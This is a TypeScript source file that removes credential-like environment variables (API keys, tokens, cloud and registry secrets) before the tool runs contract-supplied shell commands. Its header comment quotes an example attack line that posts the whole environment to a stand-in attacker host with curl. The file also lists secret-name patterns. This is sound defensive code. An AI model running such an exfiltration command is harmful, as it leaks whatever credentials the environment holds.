// Sanitized child-process environment for contract-driven shell commands.
//
// The verifier and the property-predicate runner shell out to commands that
// originate in a contract YAML or a CLI obligation, which means the command
// text is attacker-influenceable in any context that lets a third party
// supply the contract (a PR author landing a contract file, a workflow that
// runs swarm against an untrusted branch, a forked Action invocation).
//
// Previously these spawn calls passed `env: process.env`, so the contract
// command inherited ANTHROPIC_API_KEY, OPENAI_API_KEY, GITHUB_TOKEN,
// NPM_TOKEN, and any other credential the auditor's environment held. A
// command of the shape `curl -d "$(env)" https://attacker.example.com/`
// would exfiltrate every one of them.
//
// `sanitizedChildEnv()` strips the known-credential names and the common
// credential-shape patterns (anything ending in TOKEN, SECRET, PASSWORD,
// PRIVATE_KEY, API_KEY, plus vendor-prefixed buckets like ANTHROPIC_*,
// OPENAI_*, AWS_*, GH_*/GITHUB_TOKEN, NPM_*) before handing the env to the
// child. The fields the toolchain actually needs (PATH, HOME, NODE_*,
// LANG, SHELL, USER, ...) come through unchanged, so legitimate build and
// test commands keep working.
//
// `SWARM_SANDBOX_ENV=passthrough` restores the pre-existing
// `env: process.env` behavior for operators who need a specific
// credential the sanitizer would otherwise drop (a private npm registry
// auth token used by `npm install` inside the verified command, etc.).

const KNOWN_SECRET_NAMES: ReadonlySet<string> = new Set([
  'ANTHROPIC_API_KEY',
  'OPENAI_API_KEY',
  'GITHUB_TOKEN',
  'GH_TOKEN',
  'NPM_TOKEN',
]);

const SECRET_NAME_SUFFIXES: readonly string[] = [
  '_TOKEN',
  '_SECRET',
  '_PASSWORD',
  '_PASSWD',
  '_PRIVATE_KEY',
  '_API_KEY',
  '_SESSION_TOKEN',
  '_ACCESS_KEY',
];

const SECRET_NAME_PREFIXES: readonly string[] = [
  'ANTHROPIC_',
  'OPENAI_',
  'AWS_',
  'AZURE_',
  'GCP_',
  'GOOGLE_APPLICATION_',
  'NPM_',
  'PYPI_',
  'CARGO_REGISTRY_',
];

/** True when an env-var name looks like a credential the auditor holds.
 *  Names that match are dropped from the sanitized child env. */
export function looksLikeSecretName(name: string): boolean {
  if (KNOWN_SECRET_NAMES.has(name)) return true;
  for (const suffix of SECRET_NAME_SUFFIXES) {
    if (name.endsWith(suffix)) return true;
  }
  for (const prefix of SECRET_NAME_PREFIXES) {
    if (name.startsWith(prefix)) return true;
  }
  return false;
}

/**
 * Build a child-process environment with known-credential and
 * credential-shaped names stripped. The caller passes this as `env:` to
 * `spawnSync` / `execSync` for any command whose text is contract-driven
 * (and therefore attacker-influenceable). Set
 * `SWARM_SANDBOX_ENV=passthrough` to opt back into the host environment.
 */
export function sanitizedChildEnv(
  source: NodeJS.ProcessEnv = process.env,
): NodeJS.ProcessEnv {
  if ((source.SWARM_SANDBOX_ENV ?? '').trim() === 'passthrough') {
    return source;
  }
  const out: NodeJS.ProcessEnv = {};
  for (const [name, value] of Object.entries(source)) {
    if (value === undefined) continue;
    if (looksLikeSecretName(name)) continue;
    out[name] = value;
  }
  return out;
}
